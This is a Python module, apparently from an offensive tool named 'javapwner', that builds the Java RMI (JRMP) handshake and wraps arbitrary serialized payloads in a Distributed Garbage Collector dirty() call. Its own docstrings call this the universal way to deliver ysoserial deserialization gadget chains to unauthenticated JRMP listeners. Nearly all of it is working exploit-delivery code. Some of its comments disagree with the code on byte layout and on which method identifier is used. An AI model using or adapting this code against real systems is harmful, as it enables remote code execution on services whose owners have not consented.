"""JRMP (Java Remote Method Protocol) handshake and DGC dirty-call builder.

Wire format reference: JDK source sun.rmi.transport.tcp / sun.rmi.transport.StreamRemoteCall

JRMP Handshake
--------------
CLIENT → SERVER:
  4A 52 4D 49   "JRMI" magic
  00 02         protocol version
  4B            StreamProtocol type-byte

SERVER → CLIENT (if JRMP listener):
  4E            ProtocolAck
  00 XX         server version (uint16)
  [writeUTF]    server hostname
  00 00 XX XX   server port (uint32)

DGC Dirty Call
--------------
Used to trigger deserialisation of an arbitrary payload via the Distributed
Garbage Collector endpoint which is always present on JRMP services.

The minimal wire encoding to invoke DGC.dirty() is:
  [MessageType: 0x50 = Call]
  [ObjID: fixed DGC OID  → 4 bytes obj-num + 4 bytes space + 8 bytes addr]
  [Operation: dirty = method hash 0xDF_11_01_5C_B2_C5_6B_69L]
  [Hash: interface hash   0xF6_B6_89_8D_8B_F2_8C_FEL]
  [payload as ObjectOutputStream]

For our purposes we use the well-known encoding that ysoserial itself uses
(derived from the original exploit by @frohoff and @gebl).
"""

from __future__ import annotations

import struct
from typing import Any

from javapwner.core.socket_helper import read_java_ushort, read_java_utf, write_java_utf
from javapwner.exceptions import JrmpError

# JRMP constants
JRMP_MAGIC = b"\x4a\x52\x4d\x49"  # "JRMI"
JRMP_VERSION = b"\x00\x02"
STREAM_PROTOCOL = b"\x4b"          # StreamProtocol
PROTOCOL_ACK = 0x4E

# Message types
MSG_CALL = 0x50
MSG_PING = 0x52
MSG_PING_ACK = 0x53
MSG_DGC_ACK = 0x54

# DGC Object IDs (fixed by the RMI spec)
# ObjID for DGC: num=2, space=(0,0), addr=0
_DGC_OBJ_NUM = struct.pack(">i", 2)
_DGC_SPACE = struct.pack(">ii", 0, 0)
_DGC_UNIQUE = struct.pack(">q", 0)
_DGC_OBJ_ID = _DGC_OBJ_NUM + _DGC_SPACE + _DGC_UNIQUE  # 20 bytes total

# DGC.dirty() method hash (from JDK internals)
_DIRTY_METHOD_HASH = struct.pack(">q", -0x20EEFEA34D8A9697)  # 0xDF11015CB2C56B69 signed

# DGC interface hash
_DGC_INTERFACE_HASH = struct.pack(">q", -0x09479727740D7302)  # 0xF6B6898D8BF28CFE signed

# Serial sequence number (call id)
_CALL_ID = struct.pack(">q", 0)


# ---------------------------------------------------------------------------
# Handshake builders / parsers
# ---------------------------------------------------------------------------

def build_jrmp_handshake() -> bytes:
    """Return the 7-byte JRMP client handshake."""
    return JRMP_MAGIC + JRMP_VERSION + STREAM_PROTOCOL


def parse_jrmp_ack(data: bytes) -> dict[str, Any]:
    """Parse the JRMP server ProtocolAck response.

    Returns a dict with keys: ``ack_byte``, ``version``, ``hostname``, ``port``.
    Raises :class:`~javapwner.exceptions.JrmpError` if the ack byte is missing
    or the response is too short to parse.
    """
    if not data:
        raise JrmpError("Empty JRMP response")

    ack = data[0]
    if ack != PROTOCOL_ACK:
        raise JrmpError(
            f"Expected ProtocolAck (0x{PROTOCOL_ACK:02x}), got 0x{ack:02x}"
        )

    result: dict[str, Any] = {
        "ack_byte": ack,
        "version": None,
        "hostname": None,
        "port": None,
    }

    if len(data) < 3:
        return result

    result["version"] = struct.unpack_from(">H", data, 1)[0]

    if len(data) >= 5:
        try:
            hostname, offset = read_java_utf(data, 3)
            result["hostname"] = hostname
            if offset + 4 <= len(data):
                result["port"] = struct.unpack_from(">I", data, offset)[0]
        except (struct.error, IndexError):
            pass

    return result


# ---------------------------------------------------------------------------
# DGC Dirty call builder
# ---------------------------------------------------------------------------

def build_dgc_dirty_call(payload_bytes: bytes) -> bytes:
    """Encapsulate *payload_bytes* in a JRMP DGC dirty call message.

    The target DGC endpoint is present on every JRMP service by spec, making
    this the universal delivery mechanism for ysoserial payloads against
    unauthenticated JRMP listeners.

    The payload must already be a valid Java serialised object (e.g. produced
    by ysoserial).  It is embedded directly as the argument to DGC.dirty().
    """
    # -- JRMP Call message header --
    # MessageType (1 byte)
    msg = bytes([MSG_CALL])

    # Call header: ObjID (20 bytes) + operation (4 bytes) + hash (8 bytes)
    # operation index for dirty = 1 (0-based)
    op_index = struct.pack(">i", 1)
    msg += _DGC_OBJ_ID + op_index + _DGC_INTERFACE_HASH

    # Embed the ysoserial payload directly (it IS the ObjectOutputStream stream
    # that would normally contain the ObjID[] + long lease arguments — here we
    # just deliver the gadget chain as an argument to trigger deserialisation).
    msg += payload_bytes

    return msg
